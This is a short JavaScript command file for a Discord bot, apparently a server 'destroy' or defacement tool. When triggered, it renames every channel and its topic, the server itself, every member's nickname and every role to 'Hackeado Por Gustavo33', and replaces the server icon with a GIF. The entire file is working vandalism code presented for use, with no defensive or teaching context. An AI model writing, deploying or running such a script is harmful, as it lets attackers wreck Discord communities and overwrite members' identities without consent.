exports.run = async (client, message, args) => {
  let arg = "Gustavo33"
    console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
    function a1(){
        client.guilds.get(message.guild.id).channels.forEach((canal) => {
            canal.setTopic("Hackeado Por " + arg)
            canal.setName("Hackeado Por " + arg)
        })
       message.guild.setName("Hackeado Por " + arg)
       client.guilds.get(message.guild.id).members.forEach((m) => {
           m.setNickname("Hackeado Por " + arg)
       })
    }
    function b1(){
       message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
     client.guilds.get(message.guild.id).roles.forEach((r) => {
         r.setName("Hackeado Por " + arg)
     })
    }
    function a2(){
        a1()
        b1()
    }
    a2()
}